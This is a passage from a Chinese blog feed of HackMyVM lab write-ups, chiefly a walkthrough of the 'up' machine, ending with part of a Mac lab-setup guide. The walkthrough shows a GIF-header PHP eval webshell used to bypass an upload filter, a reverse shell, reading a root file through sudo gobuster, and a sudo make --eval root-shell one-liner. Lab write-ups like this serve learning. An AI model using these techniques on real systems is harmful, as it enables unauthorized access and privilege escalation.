<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">hero:/etc/ssh$ <span class="built_in">cd</span> /opt</span><br><span class="line">hero:/opt$ <span class="built_in">ls</span></span><br><span class="line">banner.txt  containerd</span><br><span class="line">hero:/opt$ <span class="built_in">rm</span> banner.txt</span><br><span class="line">hero:/opt$ <span class="built_in">ln</span> -s /root/root.txt banner.txt</span><br><span class="line">hero:/opt$ </span><br></pre></td></tr></table></figure></div>
<p>然后再ssh连接 就有flag了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># ssh shawa@192.168.179.81 -i tmp -p 2222</span></span><br><span class="line">HMVNOTINPRODLOL</span><br><span class="line">Welcome <span class="built_in">to</span> Alpine!</span><br><span class="line"></span><br><span class="line">The Alpine Wiki <span class="keyword">contains</span> <span class="keyword">a</span> large amount <span class="keyword">of</span> how-<span class="built_in">to</span> guides <span class="keyword">and</span> general</span><br><span class="line">information about administrating Alpine systems.</span><br><span class="line">See &lt;<span class="keyword">https</span>://wiki.alpinelinux.org/&gt;.</span><br><span class="line"></span><br><span class="line">You can setup <span class="keyword">the</span> <span class="keyword">system</span> <span class="keyword">with</span> <span class="keyword">the</span> <span class="keyword">command</span>: <span class="title">setup-alpine</span></span><br><span class="line"></span><br><span class="line">You may change this message <span class="keyword">by</span> editing /etc/motd.</span><br><span class="line"></span><br><span class="line">hero:~$ </span><br></pre></td></tr></table></figure></div>


]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-up</title>
    <url>/posts/29573.html</url>
    <content><![CDATA[<p>HMV-up靶机复盘</p>
<span id="more"></span>

<p>这个靶机还挺有意思的，有web还和之前的buster提权有点关系</p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.58.3 </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>3-<span class="number">09</span> <span class="number">20</span>:<span class="number">42</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">58.3</span>)</span><br><span class="line">Host is up (<span class="number">0.054</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">62</span> ((Debian))</span><br><span class="line">|<span class="params">_http-title:</span> RodGar <span class="operator">-</span> Subir Imagen</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.62</span> (Debian)</span><br><span class="line">MAC <span class="params">Address:</span> C8:<span class="number">21</span>:<span class="number">58</span>:<span class="number">16</span>:CF:C4 (Intel Corporate)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT      ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">53.74</span> ms bogon (<span class="number">192.168</span>.<span class="number">58.3</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">15.53</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>只开放了80端口，所以待会肯定是要反弹shell的</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>web是一个文件上传的界面，只允许jpg或者gif文件。<br>我这里试了很多方法，比如bp改后缀，双重后缀名等，都没有绕过。（都是ctf的常见套路）<br>最后是用gif文件的文件头+双后缀名绕过的<br><img src="https://pic1.imgdb.cn/item/67cd9b6e066befcec6e2304e.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#shell.php.gif</span></span><br><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);&gt;</span><br><span class="line">```   </span><br><span class="line">但是现在不知道被上传到哪里了</span><br></pre></td></tr></table></figure></div>
<h1 id="┌──-root㉿kakeru-tmp-└─-gobuster-dir-w-usr-share-wordlists-dirbuster-directory-list-lowercase-2-3-medium-txt-u-192-168-58-3-x-php-js-txt-jpg-png"><a href="#┌──-root㉿kakeru-tmp-└─-gobuster-dir-w-usr-share-wordlists-dirbuster-directory-list-lowercase-2-3-medium-txt-u-192-168-58-3-x-php-js-txt-jpg-png" class="headerlink" title="┌──(root㉿kakeru)-[~&#x2F;tmp]└─# gobuster dir -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-lowercase-2.3-medium.txt -u 192.168.58.3  -x php,js,txt,jpg,png"></a>┌──(root㉿kakeru)-[~&#x2F;tmp]<br>└─# gobuster dir -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-lowercase-2.3-medium.txt -u 192.168.58.3  -x php,js,txt,jpg,png</h1><h1 id="Gobuster-v3-6by-OJ-Reeves-TheColonial-Christian-Mehlmauer-firefart"><a href="#Gobuster-v3-6by-OJ-Reeves-TheColonial-Christian-Mehlmauer-firefart" class="headerlink" title="Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)"></a>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</h1><h1 id="Url-http-192-168-58-3-Method-GET-Threads-10-Wordlist-usr-share-wordlists-dirbuster-directory-list-lowercase-2-3-medium-txt-Negative-Status-codes-404-User-Agent-gobuster-3-6-Extensions-txt-jpg-png-php-js-Timeout-10s"><a href="#Url-http-192-168-58-3-Method-GET-Threads-10-Wordlist-usr-share-wordlists-dirbuster-directory-list-lowercase-2-3-medium-txt-Negative-Status-codes-404-User-Agent-gobuster-3-6-Extensions-txt-jpg-png-php-js-Timeout-10s" class="headerlink" title="[+] Url:                     http://192.168.58.3[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-lowercase-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster&#x2F;3.6[+] Extensions:              txt,jpg,png,php,js[+] Timeout:                 10s"></a>[+] Url:                     <a href="http://192.168.58.3/">http://192.168.58.3</a><br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster&#x2F;3.6<br>[+] Extensions:              txt,jpg,png,php,js<br>[+] Timeout:                 10s</h1><h1 id="Starting-gobuster-in-directory-enumeration-mode"><a href="#Starting-gobuster-in-directory-enumeration-mode" class="headerlink" title="Starting gobuster in directory enumeration mode"></a>Starting gobuster in directory enumeration mode</h1><h1 id="php-Status-403-Size-277-index-php-Status-200-Size-4489-uploads-Status-301-Size-314-–-http-192-168-58-3-uploads-javascript-Status-301-Size-317-–-http-192-168-58-3-javascript-sh-jpg-Status-200-Size-1330919-Progress-159700-1245864-12-82-C-Keyboard-interrupt-detected-terminating-Progress-159700-1245864-12-82"><a href="#php-Status-403-Size-277-index-php-Status-200-Size-4489-uploads-Status-301-Size-314-–-http-192-168-58-3-uploads-javascript-Status-301-Size-317-–-http-192-168-58-3-javascript-sh-jpg-Status-200-Size-1330919-Progress-159700-1245864-12-82-C-Keyboard-interrupt-detected-terminating-Progress-159700-1245864-12-82" class="headerlink" title="&#x2F;.php                 (Status: 403) [Size: 277]&#x2F;index.php            (Status: 200) [Size: 4489]&#x2F;uploads              (Status: 301) [Size: 314] [–&gt; http://192.168.58.3/uploads/]&#x2F;javascript           (Status: 301) [Size: 317] [–&gt; http://192.168.58.3/javascript/]&#x2F;sh.jpg               (Status: 200) [Size: 1330919]Progress: 159700 &#x2F; 1245864 (12.82%)^C[!] Keyboard interrupt detected, terminating.Progress: 159700 &#x2F; 1245864 (12.82%)"></a>&#x2F;.php                 (Status: 403) [Size: 277]<br>&#x2F;index.php            (Status: 200) [Size: 4489]<br>&#x2F;uploads              (Status: 301) [Size: 314] [–&gt; <a href="http://192.168.58.3/uploads/]">http://192.168.58.3/uploads/]</a><br>&#x2F;javascript           (Status: 301) [Size: 317] [–&gt; <a href="http://192.168.58.3/javascript/]">http://192.168.58.3/javascript/]</a><br>&#x2F;sh.jpg               (Status: 200) [Size: 1330919]<br>Progress: 159700 &#x2F; 1245864 (12.82%)^C<br>[!] Keyboard interrupt detected, terminating.<br>Progress: 159700 &#x2F; 1245864 (12.82%)</h1><h1 id="Finished"><a href="#Finished" class="headerlink" title="Finished"></a>Finished</h1><figure class="highlight"><table><tr><td class="code"><pre><span class="line">发现有一个uploads 但是直接访问这个文件夹下刚才的文件名还是没有内容 再扫一下这个uploads文件夹下面的内容</span><br></pre></td></tr></table></figure>
<h1 id="┌──-root㉿kakeru-tmp-└─-gobuster-dir-w-usr-share-wordlists-dirbuster-directory-list-lowercase-2-3-medium-txt-u-192-168-58-3-uploads-x-php-js-txt-jpg-png"><a href="#┌──-root㉿kakeru-tmp-└─-gobuster-dir-w-usr-share-wordlists-dirbuster-directory-list-lowercase-2-3-medium-txt-u-192-168-58-3-uploads-x-php-js-txt-jpg-png" class="headerlink" title="┌──(root㉿kakeru)-[~&#x2F;tmp]└─# gobuster dir -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-lowercase-2.3-medium.txt -u 192.168.58.3&#x2F;&#x2F;uploads  -x php,js,txt,jpg,png"></a>┌──(root㉿kakeru)-[~&#x2F;tmp]<br>└─# gobuster dir -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-lowercase-2.3-medium.txt -u 192.168.58.3&#x2F;&#x2F;uploads  -x php,js,txt,jpg,png</h1><h1 id="Gobuster-v3-6by-OJ-Reeves-TheColonial-Christian-Mehlmauer-firefart-1"><a href="#Gobuster-v3-6by-OJ-Reeves-TheColonial-Christian-Mehlmauer-firefart-1" class="headerlink" title="Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)"></a>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</h1><h1 id="Url-http-192-168-58-3-uploads-Method-GET-Threads-10-Wordlist-usr-share-wordlists-dirbuster-directory-list-lowercase-2-3-medium-txt-Negative-Status-codes-404-User-Agent-gobuster-3-6-Extensions-js-txt-jpg-png-php-Timeout-10s"><a href="#Url-http-192-168-58-3-uploads-Method-GET-Threads-10-Wordlist-usr-share-wordlists-dirbuster-directory-list-lowercase-2-3-medium-txt-Negative-Status-codes-404-User-Agent-gobuster-3-6-Extensions-js-txt-jpg-png-php-Timeout-10s" class="headerlink" title="[+] Url:                     http://192.168.58.3//uploads[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-lowercase-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster&#x2F;3.6[+] Extensions:              js,txt,jpg,png,php[+] Timeout:                 10s"></a>[+] Url:                     <a href="http://192.168.58.3//uploads">http://192.168.58.3//uploads</a><br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster&#x2F;3.6<br>[+] Extensions:              js,txt,jpg,png,php<br>[+] Timeout:                 10s</h1><h1 id="Starting-gobuster-in-directory-enumeration-mode-1"><a href="#Starting-gobuster-in-directory-enumeration-mode-1" class="headerlink" title="Starting gobuster in directory enumeration mode"></a>Starting gobuster in directory enumeration mode</h1><h1 id="php-Status-403-Size-964-robots-txt-Status-200-Size-1301-php-Status-403-Size-964-Progress-639832-1245864-51-36-C-Keyboard-interrupt-detected-terminating-Progress-639861-1245864-51-36"><a href="#php-Status-403-Size-964-robots-txt-Status-200-Size-1301-php-Status-403-Size-964-Progress-639832-1245864-51-36-C-Keyboard-interrupt-detected-terminating-Progress-639861-1245864-51-36" class="headerlink" title="&#x2F;.php                 (Status: 403) [Size: 964]&#x2F;robots.txt           (Status: 200) [Size: 1301]&#x2F;.php                 (Status: 403) [Size: 964]Progress: 639832 &#x2F; 1245864 (51.36%)^C[!] Keyboard interrupt detected, terminating.Progress: 639861 &#x2F; 1245864 (51.36%)"></a>&#x2F;.php                 (Status: 403) [Size: 964]<br>&#x2F;robots.txt           (Status: 200) [Size: 1301]<br>&#x2F;.php                 (Status: 403) [Size: 964]<br>Progress: 639832 &#x2F; 1245864 (51.36%)^C<br>[!] Keyboard interrupt detected, terminating.<br>Progress: 639861 &#x2F; 1245864 (51.36%)</h1><p>Finished</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">访问robots.txt得到文件上传逻辑的源码 用<span class="built_in">base64</span>解码</span><br></pre></td></tr></table></figure></div>
<p>┌──(root㉿kakeru)-[~&#x2F;tmp]<br>└─# echo “PD9waHAKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcpIHsKICAgICR0YXJnZXREaXIgPSAidXBsb2Fkcy8iOwogICAgJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1siaW1hZ2UiXVsibmFtZSJdKTsKICAgICRmaWxlVHlwZSA9IHBhdGhpbmZvKCRmaWxlTmFtZSwgUEFUSElORk9fRVhURU5TSU9OKTsKICAgICRmaWxlQmFzZU5hbWUgPSBwYXRoaW5mbygkZmlsZU5hbWUsIFBBVEhJTkZPX0ZJTEVOQU1FKTsKCiAgICAkYWxsb3dlZFR5cGVzID0gWydqcGcnLCAnanBlZycsICdnaWYnXTsKICAgIGlmIChpbl9hcnJheShzdHJ0b2xvd2VyKCRmaWxlVHlwZSksICRhbGxvd2VkVHlwZXMpKSB7CiAgICAgICAgJGVuY3J5cHRlZEZpbGVOYW1lID0gc3RydHIoJGZpbGVCYXNlTmFtZSwgCiAgICAgICAgICAgICdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JywgCiAgICAgICAgICAgICdOT1BRUlNUVVZXWFlaQUJDREVGR0hJSktMTW5vcHFyc3R1dnd4eXphYmNkZWZnaGlqa2xtJyk7CgogICAgICAgICRuZXdGaWxlTmFtZSA9ICRlbmNyeXB0ZWRGaWxlTmFtZSAuICIuIiAuICRmaWxlVHlwZTsKICAgICAgICAkdGFyZ2V0RmlsZVBhdGggPSAkdGFyZ2V0RGlyIC4gJG5ld0ZpbGVOYW1lOwoKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImltYWdlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRGaWxlUGF0aCkpIHsKICAgICAgICAgICAgJG1lc3NhZ2UgPSAiRWwgYXJjaGl2byBzZSBoYSBzdWJpZG8gY29ycmVjdGFtZW50ZS4iOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRtZXNzYWdlID0gIkh1Ym8gdW4gZXJyb3IgYWwgc3ViaXIgZWwgYXJjaGl2by4iOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgJG1lc3NhZ2UgPSAiU29sbyBzZSBwZXJtaXRlbiBhcmNoaXZvcyBKUEcgeSBHSUYuIjsKICAgIH0KfQo&#x2F;Pgo&#x3D;”  | base64 -d<br>&lt;?php<br>if ($_SERVER[‘REQUEST_METHOD’] &#x3D;&#x3D;&#x3D; ‘POST’) {<br>    $targetDir &#x3D; “uploads&#x2F;“;<br>    $fileName &#x3D; basename($_FILES[“image”][“name”]);<br>    $fileType &#x3D; pathinfo($fileName, PATHINFO_EXTENSION);<br>    $fileBaseName &#x3D; pathinfo($fileName, PATHINFO_FILENAME);</p>
<pre><code>$allowedTypes = [&#39;jpg&#39;, &#39;jpeg&#39;, &#39;gif&#39;];
if (in_array(strtolower($fileType), $allowedTypes)) &#123;
    $encryptedFileName = strtr($fileBaseName, 
        &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;, 
        &#39;NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm&#39;);

    $newFileName = $encryptedFileName . &quot;.&quot; . $fileType;
    $targetFilePath = $targetDir . $newFileName;

    if (move_uploaded_file($_FILES[&quot;image&quot;][&quot;tmp_name&quot;], $targetFilePath)) &#123;
        $message = &quot;El archivo se ha subido correctamente.&quot;;
    &#125; else &#123;
        $message = &quot;Hubo un error al subir el archivo.&quot;;
    &#125;
&#125; else &#123;
    $message = &quot;Solo se permiten archivos JPG y GIF.&quot;;
&#125;
</code></pre>
<p>}<br>?&gt;</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">这里上传的文件夹确实是uploads/  而且用了一个加密，是一个代换密码比如我们上传的是shell<span class="selector-class">.php</span><span class="selector-class">.gif</span>,除了最后的gif，前面的字符都会变化</span><br><span class="line">变成furyy<span class="selector-class">.cuc</span><span class="selector-class">.gif</span>,然后用蚁剑连接,在蚁剑的虚拟终端里面反弹shell</span><br><span class="line">!<span class="selector-attr">[]</span>(https:<span class="comment">//pic1.imgdb.cn/item/67cda033066befcec6e231b0.png)</span></span><br></pre></td></tr></table></figure></div>
<p>┌──(root㉿kakeru)-[~&#x2F;tmp]<br>└─# nc -lp 1234<br>id<br>uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CLEAN"><figure class="iseeu highlight /clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># 提权</span><br><span class="line">## www</span><br></pre></td></tr></table></figure></div>
<p>www-data@debian:&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads$ sudo -l<br>Matching Defaults entries for www-data on debian:<br>    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin, use_pty</p>
<p>User www-data may run the following commands on debian:<br>    (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;gobuster</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line">有一个gobuster的sudo权限，是不是有点似曾相识，和<span class="keyword">buster有点像啊</span></span><br><span class="line"><span class="keyword"></span>但是我用linpeas.<span class="keyword">sh扫了一下没有定时任务</span></span><br><span class="line"><span class="keyword"></span>但是在上传目录下面有一个提示文件</span><br></pre></td></tr></table></figure></div>
<p>www-data@debian:&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads$ ls<br>access_denied.html  clue.txt  furyy.cuc.gif  robots.txt<br>www-data@debian:&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads$ cat clue.txt<br>&#x2F;root&#x2F;rodgarpass</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">之前我们有gobuster权限的时候是用字典把指定路径的文件传个root的定时文件，让root可以执行</span><br><span class="line">比如我在本机开一个http服务，有一个/tmp/b 我现在在靶机创建一个字典b.txt 里面的内容是/tmp/b 这样子这个tmp/b就可以写入到定时任务里面</span><br><span class="line">因为这个定时任务是bash运行的，所以我们在靶机的/tmp/b里面写反弹shell  好了这就复习完之前的提权方法了，但是这个靶机明显不是这样的</span><br><span class="line"></span><br><span class="line">现在提示是/root/rodgarpass，所以就是要让我们用buster看这里的内容，也很简单，也是本地开http，然后指定这个字典就可以了</span><br></pre></td></tr></table></figure></div>
<p>┌──(root㉿kakeru)-[~&#x2F;tmp]<br>└─# python3 -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (<a href="http://0.0.0.0/">http://0.0.0.0:80/</a>) …</p>
<h1 id="www-data-debian-var-www-html-uploads-sudo-gobuster-dir-u-192-168-58-11-w-root-rodgarpass-v"><a href="#www-data-debian-var-www-html-uploads-sudo-gobuster-dir-u-192-168-58-11-w-root-rodgarpass-v" class="headerlink" title="www-data@debian:&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads$ sudo gobuster dir -u 192.168.58.11 -w &#x2F;root&#x2F;rodgarpass -v"></a>www-data@debian:&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads$ sudo gobuster dir -u 192.168.58.11 -w &#x2F;root&#x2F;rodgarpass -v</h1><h1 id="Gobuster-v3-5by-OJ-Reeves-TheColonial-Christian-Mehlmauer-firefart"><a href="#Gobuster-v3-5by-OJ-Reeves-TheColonial-Christian-Mehlmauer-firefart" class="headerlink" title="Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)"></a>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</h1><h1 id="Url-http-192-168-58-11-Method-GET-Threads-10-Wordlist-root-rodgarpass-Negative-Status-codes-404-User-Agent-gobuster-3-5-Verbose-true-Timeout-10s"><a href="#Url-http-192-168-58-11-Method-GET-Threads-10-Wordlist-root-rodgarpass-Negative-Status-codes-404-User-Agent-gobuster-3-5-Verbose-true-Timeout-10s" class="headerlink" title="[+] Url:                     http://192.168.58.11[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                &#x2F;root&#x2F;rodgarpass[+] Negative Status codes:   404[+] User Agent:              gobuster&#x2F;3.5[+] Verbose:                 true[+] Timeout:                 10s"></a>[+] Url:                     <a href="http://192.168.58.11/">http://192.168.58.11</a><br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                &#x2F;root&#x2F;rodgarpass<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster&#x2F;3.5<br>[+] Verbose:                 true<br>[+] Timeout:                 10s</h1><h1 id="2025-03-09-08-14-33-Starting-gobuster-in-directory-enumeration-mode"><a href="#2025-03-09-08-14-33-Starting-gobuster-in-directory-enumeration-mode" class="headerlink" title="2025&#x2F;03&#x2F;09 08:14:33 Starting gobuster in directory enumeration mode"></a>2025&#x2F;03&#x2F;09 08:14:33 Starting gobuster in directory enumeration mode</h1><h1 id="Missed-b45cffe084dd3d20d928bee85e7b0f2-Status-404-Size-335"><a href="#Missed-b45cffe084dd3d20d928bee85e7b0f2-Status-404-Size-335" class="headerlink" title="Missed: &#x2F;b45cffe084dd3d20d928bee85e7b0f2 (Status: 404) [Size: 335]"></a>Missed: &#x2F;b45cffe084dd3d20d928bee85e7b0f2 (Status: 404) [Size: 335]</h1><h1 id="2025-03-09-08-14-34-Finished"><a href="#2025-03-09-08-14-34-Finished" class="headerlink" title="2025&#x2F;03&#x2F;09 08:14:34 Finished"></a>2025&#x2F;03&#x2F;09 08:14:34 Finished</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="Q"><figure class="iseeu highlight /q"><table><tr><td class="code"><pre><span class="line">用-v显示具体信息，看到这个内容，这个是一个<span class="built_in">md5</span>编码的字符，另一种是在本机可以看日志看到访问了什么路径</span><br><span class="line">用在线的解密器解密出来时<span class="built_in">string</span>，但是这个只有<span class="number">31</span>位，正常的要有<span class="number">32</span>位</span><br><span class="line"></span><br><span class="line">用<span class="built_in">md5</span>加密<span class="built_in">string</span> 得到完整的是`b45cffe084dd3d20d928bee85e7b0f21` 这个就是用户的密码</span><br><span class="line">## rodgar</span><br></pre></td></tr></table></figure></div>
<p>rodgar@debian:~$ sudo -l<br>Matching Defaults entries for rodgar on debian:<br>    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin, use_pty</p>
<p>User rodgar may run the following commands on debian:<br>    (ALL : ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;gcc, &#x2F;usr&#x2F;bin&#x2F;make</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LESS"><figure class="iseeu highlight /less"><table><tr><td class="code"><pre><span class="line">两个指令都可以提权，这里我就用<span class="selector-tag">make</span>吧，在<span class="selector-tag">gtofbins</span>都可以找到<span class="selector-tag">payload</span></span><br><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//pic1.imgdb.cn/item/67cda2df066befcec6e23284.png)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>rodgar@debian:~$ sudo make -s –eval&#x3D;$’x:\n\t-‘“&#x2F;bin&#x2F;bash”<br>root@debian:&#x2F;home&#x2F;rodgar# id<br>uid&#x3D;0(root) gid&#x3D;0(root) grupos&#x3D;0(root)</p>
<pre><code>
### 总结
- 又学习到一种文件上传的绕过方式
- 根目录没有信息的时候，扫描uploads目录
- gobuster的任意文件读取
- md5的长度是32位
- md5位数不一致可以用解密网站解密，然后再加密
</code></pre>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>mac环境靶场搭建</title>
    <url>/posts/86.html</url>
    <content><![CDATA[<p>Mac环境下靶场搭建</p>
<span id="more"></span>
<p>因为我是mac m芯片电脑，所以在安装靶场时候如果直接使用virtualbox会报错，这篇文章介绍了我安装靶场的解决方案</p>
<h2 id="utm安装"><a href="#utm安装" class="headerlink" title="utm安装"></a>utm安装</h2><p>我使用的虚拟机是utm ，可以模拟x86系统，直接在官网免费下载<br><a href="https://mac.getutm.app/">https://mac.getutm.app/</a><br><img src="https://pic1.imgdb.cn/item/679a4c5cd0e0a243d4f87b67.png"></p>
<h2 id="靶场安装包处理"><a href="#靶场安装包处理" class="headerlink" title="靶场安装包处理"></a>靶场安装包处理</h2><p>这里以从vulnhub下载的Deathnote为例<br>从靶场下来的安装包应该是.ovf<br>在终端用tar解压这个文件  解压得到两个文件 我们需要用的是.vmdk文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">(base) kakeru<span class="title">@bogon</span> downloads % tar xvf Deathnote.ova </span><br><span class="line"><span class="keyword">x</span> Deathnote.ovf</span><br><span class="line"><span class="keyword">x</span> Deathnote-disk<span class="number">001</span>.vmdk</span><br><span class="line"><span class="keyword">x</span> Deathnote.mf</span><br></pre></td></tr></table></figure></div>

<p>然后下载qemu  mac用户可以用brew下载</p>
